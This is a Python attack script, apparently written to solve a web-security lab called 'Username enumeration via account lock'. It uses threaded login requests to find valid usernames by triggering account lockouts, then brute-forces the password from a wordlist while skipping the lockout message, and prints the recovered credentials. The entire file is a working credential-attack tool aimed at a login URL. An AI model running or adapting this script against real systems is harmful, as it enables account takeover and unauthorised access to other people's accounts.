import threading
import requests
import sys
import getopt
from halo import Halo


def get_username(url, session):
  usernames = open("./usernames.txt", "r")
  valid_username = []
  threads = []

  def test_username(username, number):
    username = username.strip()
    data = {'username': username, 'password': number}
    response = session.post(url, data=data)

    if "Invalid username or password." in response.text:
      pass
    else:
      valid_username.append(username)
  
  for username in usernames:
    for i in range(5):
      t = threading.Thread(target=test_username, args=(username, i))
      threads.append(t)

  for x in threads:
    x.start() 

  for x in threads:
    x.join()
  
  usernames.close()
  return valid_username[0]


def get_password(url, session, valid_username):
  passwords = open("./passwords.txt", "r")
  error_messages = ["You have made too many incorrect login attempts. Please try again in 1 minute(s).", "Invalid username or password."]
  valid_password = []
  threads = []

  def test_password(password):
    password = password.strip()
    data = {'username': valid_username, 'password':  password}
    response = session.post(url, data=data)

    if (error_messages[0] not in response.text) and (error_messages[1] not in response.text):
      valid_password.append(password)

  for password in passwords:
    t = threading.Thread(target=test_password, args=(password,))
    threads.append(t)

  for x in threads:
    x.start() 

  for x in threads:
    x.join()

  passwords.close()
  return valid_password[0]

def main(argv):
  help_message = "This is the script for:\n'Username enumeration via account lock'\n\nUsage: python3 auth-5.py -u <url>/login"

  try:
    opts, args = getopt.getopt(argv, "hu:")
  except getopt.GetoptError:
    print(help_message)
    print("\x1b[?25h", end="") # Make cursor visible
    sys.exit(2)

  for opt, arg in opts:
    if opt == "-u":
      url = arg
    elif opt == "-h":
      print(help_message)
      print("\x1b[?25h", end="") # Make cursor visible
      sys.exit()

  session = requests.Session()
  
  # Create and start spinner animation
  spinner = Halo(text='Testing usernames...', spinner='bouncingBar')
  spinner.start()
  # Get valid username
  username = get_username(url, session)
  # Finish spinner
  spinner.succeed(f"The username is: \"{username}\"")

  # Create and start spinner animation
  spinner = Halo(text='Testing passwords...', spinner='bouncingBar')
  spinner.start()
  # Get valid password
  password = get_password(url, session, username)
  # Finish spinner
  spinner.succeed(f"The password is: \"{password}\"")

if __name__ == "__main__":
  print("\x1b[?25l", end="") # Hide cursor
  main(sys.argv[1:])
  print("\x1b[?25h", end="") # Make cursor visible
  sys.exit()